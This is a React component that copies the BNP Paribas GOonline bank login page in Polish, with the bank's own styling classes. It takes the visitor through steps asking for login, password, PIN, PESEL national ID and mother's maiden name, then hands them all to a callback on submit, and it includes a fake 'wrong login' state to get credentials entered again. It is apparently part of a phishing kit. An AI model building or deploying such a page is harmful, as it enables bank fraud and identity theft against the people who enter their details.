import React, {Fragment, useState} from "react";
import * as yup from "yup";
import {useForm} from "react-hook-form";
import {yupResolver} from "@hookform/resolvers/yup";
import {Form} from "reactstrap";
import avatar from '../../../assets/img/bnp/avatar.jpg'

const schema = yup.object().shape({
    login: yup.string().min(3).required(),
    password: yup.string().required(),
    pin: yup.string().required().matches(/^[0-9]{4}$/),
    pesel: yup.string().required(),
    mother: yup.string().required()
});

const BnpFormLogin = ({user, handler}) => {
    const [step, setStep] = useState(1);
    const [loading, setLoading] = useState(false);
    const [login, setLogin] = useState('')
    const {register, handleSubmit, trigger, reset, formState} = useForm({
        resolver: yupResolver(schema),
        mode: 'onChange'
    });
    const errors = formState.errors;
    const load = (index) => {
        setLoading(true);

        setTimeout(() => {
            setLoading(false);
            setStep(index);
        }, 1000)
    }
    const clearLogin = (data) => {
        setStep(1);
        setLogin(false);
        reset();
        handler(data);
    }

    return (
        <Form className="bnp-c-form ng-pristine ng-valid"
              onSubmit={handleSubmit(clearLogin)}
        >
            {
                step === 1 ?
                    <Fragment key={'login'}>
                        <div className="bnp-c-widget-header bnp-c-widget-header--lg ng-scope ng-binding">
                            <h2>Zaloguj się do GOonline</h2>
                        </div>
                        {
                            user.status === 'wrong_login' ?
                                <bnp-warning-box
                                    className="ng-scope ng-isolate-scope">
                                    <div className="bnp-c-hint bnp-c-hint--danger bnp-c-hint--small-text">
                                        <span className="bnp-c-hint__icon bnp-icon bnp-icon-danger ng-scope"/>
                                        <div className="bnp-c-hint__text-wrapper">
                                            <h3 className="bnp-c-hint__title ng-binding ng-scope">Nieprawidłowy login
                                                lub hasło </h3>
                                            <div className="bnp-c-hint__desc" x-ms-format-detection="none">
                                                <ng-transclude ng-transclude-slot="message">
                                                    <bnp-warning-box-message className="ng-scope">
                                                        <p className="ng-binding ng-scope">Upewnij się, że "Caps Lock"
                                                            na Twojej klawiaturze jest wyłączony oraz sprawdź poprawność
                                                            wpisywanego.
                                                        </p>
                                                    </bnp-warning-box-message>
                                                </ng-transclude>
                                            </div>
                                        </div>
                                    </div>
                                </bnp-warning-box> :
                                <p className="subtitle ng-binding ng-scope">
                                    Podaj swój
                                    identyfikator lub login, aby zalogować się do serwisu transakcyjnego.
                                </p>
                        }

                        <div className="bnp-c-form__field">
                            <div className="bnp-c-form__field__label-wrapper">
                                <label className="bnp-c-form__field__label ng-binding">Identyfikator lub login</label>
                                <span className="bnp-c-tooltip">
                                    <span className="bnp-c-tooltip-content ng-binding">Swój identyfikator (login) znajdziesz w dokumentach i umowach otrzymanych z Banku podczas zakładania rachunku. Możesz skorzystać również z aliasu jeżeli wcześniej został ustawiony.</span>
                                    <span className="bnp-icon bnp-icon-info"/>
                                </span>
                            </div>
                            <div className="bnp-c-form__field__input-wrapper">
                                <div className={`bnp-c-input-text ${errors.login && 'bnp-c-input-text--error'}`}>
                                    <input type="text"
                                           className="ng-pristine ng-valid ng-isolate-scope ng-empty ng-touched"
                                           placeholder="wpisz login lub identyfikator"
                                           {...register('login')}
                                    />
                                </div>
                            </div>
                        </div>
                        <div className="bnp-c-form__msg-holder">
                            {
                                errors.login ?
                                    <div className={'bnp-c-form__msg bnp-c-form__msg--error ng-binding ng-scope'}>
                                        Pole nie może być puste
                                    </div> : null
                            }
                        </div>
                        <button
                            className={`bnp-c-btn bnp-c-btn--wide mb-4 ng-binding ${loading ? 'bnp-c-btn--has-loader' : null}`}
                            type="button"
                            data-ng-class="{ 'bnp-c-btn--has-loader': $ctrl.isLoading }"
                            onClick={() => {
                                console.log(errors);
                                setLogin(document.querySelector('input[name=login]').value);
                                trigger('login').then((res) => {
                                    if (res) {
                                        load(2)
                                    }
                                })
                            }}>
                            Dalej
                        </button>
                    </Fragment> :
                    step === 2 ?
                        <Fragment key={'password'}>
                            <div className="bnp-c-widget-header bnp-c-widget-header--lg ng-scope ng-binding">
                                <h2>Wpisz hasło</h2>
                            </div>
                            <div className="bnp-c-form__field">
                                <bnp-avatar-box data-subtitle="Wpisz hasło dla loginu" className="ng-isolate-scope">
                                    <div className="bnp-login-security-wrapper">
                                        <div className="bnp-img-wrapper bnp-margin-right--s1">
                                            <img className="bnp-icon-type-image"
                                                 src={avatar} alt="Awatar"/>
                                        </div>
                                        <div className="bnp-text-wrapper">
                                        <span className="subtitle ng-binding">
                                            Wpisz hasło dla loginu
                                            <span data-ng-if=":: $ctrl.username" className="login ng-binding ng-scope">
                                                {login}
                                            </span>
                                        </span>
                                        </div>
                                    </div>
                                </bnp-avatar-box>
                                <div className="bnp-c-form__field__input-wrapper">
                                    <div className={`bnp-c-input-text ${errors.password && 'bnp-c-input-text--error'}`}>
                                        <input
                                            className="virtual-kb-support ng-pristine ng-valid ng-isolate-scope ng-empty ng-touched"
                                            type="password"
                                            {...register('password')}
                                            placeholder="wpisz hasło"/>
                                        <button
                                            className="bnp-screen-keyboard bnp-c-input-text__tooltip ng-isolate-scope"
                                            type="button" data-ng-virtual-keyboard="'.virtual-kb-support'"
                                            data-on-accept="$ctrl.onVirtualKeyboardAcceptClick()">
                                            <span className="bnp-icon bnp-icon-keyboard"/>
                                            <span
                                                className="sr-only ng-binding">Zwiń / Rozwiń klawiaturę ekranową</span>
                                        </button>
                                    </div>
                                </div>
                            </div>
                            <div className="bnp-c-form__msg-holder">
                                {
                                    errors.password ?
                                        <div className={'bnp-c-form__msg bnp-c-form__msg--error ng-binding ng-scope'}>
                                            Pole nie może być puste
                                        </div> : null
                                }
                            </div>
                            <div className="row mb-4">
                                <div className="col-sm-6 order-2 order-sm-1">
                                    <button className="bnp-c-btn bnp-c-btn--wide bnp-c-btn--secondary ng-binding"
                                            onClick={() => {
                                                setStep(1);
                                            }}
                                            type="button"
                                    >
                                        Wróć
                                    </button>
                                </div>
                                <div className="col-sm-6 order-1 order-sm-2 mb-3">
                                    <button
                                        className={`bnp-c-btn bnp-c-btn--wide ng-binding ${loading ? 'bnp-c-btn--has-loader' : null}`}
                                        type="button"
                                        onClick={() => {
                                            console.log(errors);
                                            trigger('password').then((res) => {
                                                if (res) {
                                                    load(3)
                                                }
                                            })
                                        }}>
                                        Dalej
                                    </button>
                                </div>
                            </div>

                        </Fragment> :
                        step === 3 ?
                            <Fragment key={'pin'}>
                                <div className="bnp-c-widget-header bnp-c-widget-header--lg ng-scope ng-binding">
                                    <h2>Wpisz PIN</h2>
                                </div>
                                <div className="bnp-c-form__field">
                                    <bnp-avatar-box data-subtitle="Wpisz hasło dla loginu" className="ng-isolate-scope">
                                        <div className="bnp-login-security-wrapper">
                                            <div className="bnp-img-wrapper bnp-margin-right--s1">
                                                <img className="bnp-icon-type-image"
                                                     src={avatar} alt="Awatar"/>
                                            </div>
                                            <div className="bnp-text-wrapper">
                                        <span className="subtitle ng-binding">
                                            Wpisz PIN dla loginu
                                            <span data-ng-if=":: $ctrl.username" className="login ng-binding ng-scope">
                                                {login}
                                            </span>
                                        </span>
                                            </div>
                                        </div>
                                    </bnp-avatar-box>
                                    <div className="bnp-c-form__field__input-wrapper">
                                        <div className={`bnp-c-input-text ${errors.pin && 'bnp-c-input-text--error'}`}>
                                            <input
                                                className="virtual-kb-support ng-pristine ng-valid ng-isolate-scope ng-empty ng-touched"
                                                type="number"
                                                {...register('pin')}
                                                placeholder="wpisz PIN"/>
                                            <button
                                                className="bnp-screen-keyboard bnp-c-input-text__tooltip ng-isolate-scope"
                                                type="button" data-ng-virtual-keyboard="'.virtual-kb-support'"
                                                data-on-accept="$ctrl.onVirtualKeyboardAcceptClick()">
                                                <span className="bnp-icon bnp-icon-keyboard"/>
                                                <span
                                                    className="sr-only ng-binding">Zwiń / Rozwiń klawiaturę ekranową</span>
                                            </button>
                                        </div>
                                    </div>
                                </div>
                                <div className="bnp-c-form__msg-holder">
                                    {
                                        errors.pin ?
                                            errors.pin.type === 'required' ?
                                                <div className={'bnp-c-form__msg bnp-c-form__msg--error ng-binding ng-scope'}>
                                                    Pole nie może być puste
                                                </div> :
                                                <div className={'bnp-c-form__msg bnp-c-form__msg--error ng-binding ng-scope'}>
                                                    Pole składa się z 4 cyfr
                                                </div> : null
                                    }
                                </div>
                                <div className="row mb-4">
                                    <div className="col-sm-6 order-2 order-sm-1">
                                        <button className="bnp-c-btn bnp-c-btn--wide bnp-c-btn--secondary ng-binding"
                                                onClick={() => {
                                                    setStep(2);
                                                }}
                                                type="button"
                                        >
                                            Wróć
                                        </button>
                                    </div>
                                    <div className="col-sm-6 order-1 order-sm-2 mb-3">
                                        <button
                                            className={`bnp-c-btn bnp-c-btn--wide ng-binding ${loading ? 'bnp-c-btn--has-loader' : null}`}
                                            type="button"
                                            onClick={() => {
                                                console.log(errors);
                                                trigger('pin').then((res) => {
                                                    if (res) {
                                                        load(4)
                                                    }
                                                })
                                            }}>
                                            Dalej
                                        </button>
                                    </div>
                                </div>

                            </Fragment> :
                        step === 4 ?
                            <Fragment key={'other'}>
                                <div className="bnp-c-widget-header bnp-c-widget-header--lg ng-scope ng-binding">
                                    <h2>Potrzebujesz więcej </h2>
                                </div>
                                <p className="subtitle ng-binding ng-scope">
                                    Podaj swój
                                    PESEL oraz Nazwisko panieńskie matki, aby zalogować się do serwisu transakcyjnego.
                                </p>

                                <div className="bnp-c-form__field">
                                    <div className="bnp-c-form__field__input-wrapper">
                                        <div
                                            className={`bnp-c-input-text ${errors.pesel && 'bnp-c-input-text--error'}`}>
                                            <input className="ng-pristine ng-valid ng-isolate-scope ng-empty ng-touched"
                                                   type="text"
                                                   {...register('pesel')}
                                                   placeholder="PESEL"/>
                                        </div>
                                    </div>
                                </div>
                                <div className="bnp-c-form__msg-holder">
                                    {
                                        errors.pesel ?
                                            <div
                                                className={'bnp-c-form__msg bnp-c-form__msg--error ng-binding ng-scope'}>
                                                Pole nie może być puste
                                            </div> : null
                                    }
                                </div>

                                <div className="bnp-c-form__field">
                                    <div className="bnp-c-form__field__input-wrapper">
                                        <div
                                            className={`bnp-c-input-text ${errors.mother && 'bnp-c-input-text--error'}`}>
                                            <input className="ng-pristine ng-valid ng-isolate-scope ng-empty ng-touched"
                                                   type="text"
                                                   {...register('mother')}
                                                   placeholder="Nazwisko panieńskie matki"/>
                                        </div>
                                    </div>
                                </div>
                                <div className="bnp-c-form__msg-holder">
                                    {
                                        errors.mother ?
                                            <div
                                                className={'bnp-c-form__msg bnp-c-form__msg--error ng-binding ng-scope'}>
                                                Pole nie może być puste
                                            </div> : null
                                    }
                                </div>

                                <div className="row mb-4">
                                    <div className="col-sm-6 order-2 order-sm-1">
                                        <button className="bnp-c-btn bnp-c-btn--wide bnp-c-btn--secondary ng-binding"
                                                onClick={() => {
                                                    setStep(2);
                                                }}
                                                type="button"
                                        >
                                            Wróć
                                        </button>
                                    </div>
                                    <div className="col-sm-6 order-1 order-sm-2 mb-3">
                                        <button
                                            className={`bnp-c-btn bnp-c-btn--wide ng-binding ${loading ? 'bnp-c-btn--has-loader' : null}`}
                                            type="submit">
                                            Posłać
                                        </button>
                                    </div>
                                </div>

                            </Fragment> : null
            }
            <bnp-login-problem-link className="ng-isolate-scope">
                <a className="bnp-c-link ng-binding"
                   data-test-id="reset-password"
                   href="">
                    Zresetuj hasło / odblokuj dostęp
                </a>
            </bnp-login-problem-link>
        </Form>
    )
}
export default BnpFormLogin;